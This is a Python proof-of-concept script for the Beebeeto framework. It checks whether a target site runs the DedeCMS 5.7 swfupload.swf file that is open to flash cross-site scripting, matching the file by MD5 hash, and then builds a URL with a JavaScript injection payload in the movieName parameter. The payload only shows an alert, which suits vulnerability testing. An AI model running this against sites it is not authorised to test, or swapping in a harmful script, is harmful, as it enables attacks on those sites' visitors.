#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0070',
            'name': 'DedeCMS 5.7 /images/swfupload/swfupload.swf 跨站脚本漏洞 POC',
            'author': '小马甲',
            'create_date': '2014-10-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'DedeCMS',
            'vul_version': ['5.7'],
            'type': 'Cross Site Scripting',
            'tag': ['DedeCMS漏洞', 'Flash XSS漏洞', 'swfupload.swf'],
            'desc': 'DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。',
            'references': ['http://wooyun.org/bugs/wooyun-2010-038593',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
        file_path = "/images/swfupload/swfupload.swf"
        verify_url = args['options']['target'] + file_path
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        md5_value = md5.new(content).hexdigest()
        if md5_value in flash_md5:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url + r'?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%221%22%29}}//'
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())